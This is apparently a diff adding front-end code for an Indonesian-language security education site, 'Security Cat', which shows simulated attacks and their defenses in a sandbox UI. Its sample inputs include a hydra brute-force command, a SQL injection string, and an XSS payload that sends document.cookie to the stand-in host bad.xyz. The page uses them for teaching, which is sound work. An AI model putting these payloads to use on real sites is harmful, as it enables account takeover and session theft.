+          <span>[MONITOR]: /api/v1/auth/token endpoint</span>
+          <span class="text-error">[RATE SPIKE: +900%]</span>
+        </div>
+        <div class="text-primary-fixed">
+          <span class="text-secondary">$</span> hydra -l admin -P /usr/share/wordlists/rockyou.txt target.internal http-post-form
+        </div>
+        <div class="text-error bg-surface-container-high p-2.5 rounded font-code-xs">
+          <span class="font-bold text-error">[THRESHOLD REACHED]:</span> 5 failed logins within 60s from subnet 185.220.101.0/24
+        </div>
+        <div class="text-tertiary-container flex items-center gap-1.5">
+          <span class="material-symbols-outlined text-[16px]">lock_clock</span>
+          <span>Redis Rate Limiter Activated: Exponential backoff + hCaptcha issued.</span>
+        </div>
+      `;
+      if (aiStatus) aiStatus.textContent = 'Brute force dicegat! IP penyerang dikarantina selama 15 menit.';
+    }
+  }
+
+  function loadScenario(scenario) {
+    const btns = ['sqli', 'xss', 'brute'];
+    btns.forEach(s => {
+      const b = document.getElementById('scenario-btn-' + s);
+      if (b) {
+        if (s === scenario) {
+          b.className = 'scenario-btn px-4 py-2 rounded-lg font-code-md text-code-md font-semibold bg-primary-container text-on-primary-container shadow-sm';
+        } else {
+          b.className = 'scenario-btn px-4 py-2 rounded-lg font-code-md text-code-md font-semibold bg-surface-container text-on-surface-variant hover:text-on-surface';
+        }
+      }
+    });
+
+    const input = document.getElementById('attacker-input');
+    const attackerLog = document.getElementById('attacker-log');
+    const defenderLog = document.getElementById('defender-log');
+
+    if (scenario === 'sqli') {
+      input.value = "' OR 1=1 --";
+      attackerLog.innerHTML = `
+        <div class="text-on-surface-variant">[14:32:01.042] Mengirim string manipulasi kutip tunggal...</div>
+        <div class="text-error font-bold">[14:32:01.120] Menghasilkan logika boolean TRUE tak terbatas.</div>
+        <div class="text-on-surface-variant">[14:32:01.185] Mengharapkan respon dump data tabel pengguna.</div>
+      `;
+      defenderLog.innerHTML = `
+        <div class="text-tertiary-fixed">[14:32:01.048] [WAF INTERCEPT]: Pola SQL Metacharacter terdeteksi (OR 1=1).</div>
+        <div class="text-secondary">[14:32:01.050] Parameter lolos sanitasi & di-binding sebagai string literal literal_val="' OR 1=1 --"</div>
+        <div class="text-primary">[14:32:01.055] Query tidak mengalami modifikasi struktur pohon sintaks.</div>
+        <div class="text-tertiary-fixed font-bold">[14:32:01.060] [HASIL]: Login Gagal (User Not Found) - Data terlindungi 100%.</div>
+      `;
+    } else if (scenario === 'xss') {
+      input.value = '<script>fetch("//bad.xyz/?c="+document.cookie)<\/script>';
+      attackerLog.innerHTML = `
+        <div class="text-on-surface-variant">[14:35:10.104] Mengunggah payload XSS ke kolom bio profil...</div>
+        <div class="text-error font-bold">[14:35:10.150] Berharap browser korban mengeksekusi fetch document.cookie.</div>
+        <div class="text-on-surface-variant">[14:35:10.220] Menunggu token admin di web logger luar...</div>
+      `;
+      defenderLog.innerHTML = `
+        <div class="text-tertiary-fixed">[14:35:10.112] [CSP TRIGGERED]: Content-Security-Policy melarang inline script & eksternal fetch.</div>
+        <div class="text-secondary">[14:35:10.118] DOMPurify otomatis mengubah &lt;script&gt; menjadi entitas aman (&amp;lt;script&amp;gt;).</div>
+        <div class="text-tertiary-fixed font-bold">[14:35:10.125] Cookie dilindungi flag HttpOnly + SameSite=Strict (Tidak terbaca JS).</div>
+      `;
+    } else if (scenario === 'brute') {
+      input.value = "admin : [dictionary rockyou.txt line 4002]";
+      attackerLog.innerHTML = `
+        <div class="text-on-surface-variant">[14:38:00.002] Multi-thread credential stuffing aktif (1,000 req/sec)...</div>
+        <div class="text-error font-bold">[14:38:00.410] 24 variasi kata sandi terkirim secara paralel.</div>
+        <div class="text-on-surface-variant">[14:38:00.820] Server mulai memperlambat respons koneksi...</div>
+      `;
+      defenderLog.innerHTML = `
+        <div class="text-tertiary-fixed">[14:38:00.250] [RATE LIMIT]: IP Throttling memicu status 429 Too Many Requests.</div>
+        <div class="text-secondary">[14:38:00.310] Akun 'admin' sementara dikunci (Lockout 10 menit).</div>
+        <div class="text-tertiary-fixed font-bold">[14:38:00.350] Tantangan 2FA WebAuthn/FIDO2 diminta sebelum sesi berikutnya.</div>
+      `;
+    }
+  }
+
+  function triggerSimulationPulse() {
+    const log = document.getElementById('defender-log');
+    if (log) {
+      const pulseDiv = document.createElement('div');
+      pulseDiv.className = 'text-tertiary-container bg-surface-container-high p-2 rounded animate-pulse font-bold';
+      pulseDiv.textContent = '⚡ [VERIFIKASI REAL-TIME]: Serangan dinetralkan seketika oleh Security Cat Sandbox Engine!';
+      log.prepend(pulseDiv);
+      setTimeout(() => {
+        if (pulseDiv) pulseDiv.remove();
+      }, 3500);
+    }
+  }
+
+  function toggleFaq(element) {
+    const answer = element.querySelector('p');
+    const icon = element.querySelector('.faq-icon');
+    if (answer) {
+      const isHidden = answer.classList.contains('hidden');
+      if (isHidden) {
+        answer.classList.remove('hidden');
+        if (icon) icon.style.transform = 'rotate(180deg)';
+      } else {
+        answer.classList.add('hidden');
+        if (icon) icon.style.transform = 'rotate(0deg)';
+      }
+    }
+  }
+</script></main><footer class="w-full bg-surface-container-lowest py-gutter-xl"><div class="w-full px-gutter-lg lg:px-margin-desktop"><div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-gutter-xl pb-gutter-xl"><div class="lg:col-span-2 flex flex-col gap-4"><div class="flex items-center gap-3"><img alt="Security Cat Logo" class="w-9 h-9 object-contain" src="https://lh3.googleusercontent.com/aida-public/AB6AXuABW3a9CEj1RCVtbi0eWkyuM5jtYoXQDe4uSwPjIzRYBvwimt-0APLNRwF0tTlTGARkdxEUxuDk3hjiv4LjAY-UW8FsFnrR6AiyEvgsAC2e7Z6F3VZ5EQvDbKlrGejAyHfVHObfRAjnQe-CH6LMgn8rvu-hAVWaeXNG5LYPxjprW7DF3A2KU8mjINNmraQRLL8UXQ4jpMi4m9JPGrT3ZAtOGnfHABnidGnsxETcoSH-I7a8jemGJBvvT5M3Vwf5q9JoBw"><span class="font-headline-sm text-headline-sm text-primary font-bold">Security Cat</span></div><p class="font-body-md text-body-md text-on-surface-variant max-w-sm">Platform interaktif visualisasi taktik peretasan dan teknik pertahanan real-time berbasis White Hat. Eksplorasi kerentanan dalam sandbox terisolasi tanpa risiko.</p><div class="flex items-center gap-3 mt-2"><div class="flex items-center gap-2 px-3 py-1.5 rounded-full bg-surface-container-high"><span class="inline-block w-2 h-2 rounded-full bg-tertiary-fixed shadow-[0_0_8px_rgba(111,251,190,0.8)]"></span><span class="font-label-caps text-label-caps text-tertiary-fixed uppercase">Sistem Pertahanan: Aktif 99.9%</span></div></div></div><div><h4 class="font-headline-sm text-headline-sm text-on-surface mb-4">Lab Simulasi</h4><ul class="space-y-2.5"><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="simulasi-sql-injection" href="#">SQL Injection Arena</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="simulasi-phishing" href="#">Phishing Header Forensic</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="simulasi-brute-force" href="#">Brute Force &amp; Auth Flow</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="lab-interaktif" href="#">Sandbox Shell CLI</a></li></ul></div><div><h4 class="font-headline-sm text-headline-sm text-on-surface mb-4">Materi Pertahanan</h4><ul class="space-y-2.5"><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="modul-mitigasi" href="#">Blue Team Playbooks</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="katalog-serangan" href="#">MITRE ATT&amp;CK Mapping</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="leaderboard-ctf" href="#">CTF Defense Protocols</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="modul-mitigasi" href="#">Zero Trust Architecture</a></li></ul></div><div><h4 class="font-headline-sm text-headline-sm text-on-surface mb-4">Resource &amp; Legal</h4><ul class="space-y-2.5"><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="katalog-serangan" href="#">Exploit Cheat Sheet</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="lab-interaktif" href="#">Komunitas Discord &amp; CTF</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="beranda" href="#">Ethical Code of Conduct</a></li><li class="list-none"><a class="font-body-md text-body-md text-on-surface-variant hover:text-primary transition-colors" data-path="beranda" href="#">Sertifikasi White Hat</a></li></ul></div></div><div class="mt-8 pt-8 flex flex-col md:flex-row items-center justify-between gap-4"><div class="flex items-center gap-4 text-secondary"><span class="font-label-caps text-label-caps uppercase">[ ISO/IEC 27001 COMPLIANT ]</span><span class="font-label-caps text-label-caps uppercase">[ OWASP TOP 10 LABS ]</span><span class="font-label-caps text-label-caps uppercase">[ SOC2 TYPE II READY ]</span></div><div class="font-body-sm text-body-sm text-on-surface-variant text-center md:text-right max-w-xl">© 2024 Security Cat Education. Eksklusif untuk tujuan edukasi keamanan informasi etis (White Hat). Segala aksi tanpa izin pada sistem target nyata adalah tindakan ilegal.</div></div></div></footer>
+
+
+
+<script>
+  function toggleProfileDropdown(e) {
+    if (e) e.stopPropagation();
+    const menu = document.getElementById('profile-dropdown-menu');
+    const btn = document.getElementById('profile-toggle-btn');
+    if (menu) {
+      const isHidden = menu.classList.contains('hidden');
+      if (isHidden) {
+        menu.classList.remove('hidden');
+        if (btn) btn.setAttribute('aria-expanded', 'true');
+      } else {
+        menu.classList.add('hidden');
+        if (btn) btn.setAttribute('aria-expanded', 'false');
+      }
+    }
+  }
+
+  document.addEventListener('click', function(e) {
+    const container = document.getElementById('profile-dropdown-container');
+    const menu = document.getElementById('profile-dropdown-menu');
+    const btn = document.getElementById('profile-toggle-btn');
+    if (container && !container.contains(e.target) && menu && !menu.classList.contains('hidden')) {
+      menu.classList.add('hidden');
+      if (btn) btn.setAttribute('aria-expanded', 'false');
+    }
+  });
+</script></body></html>
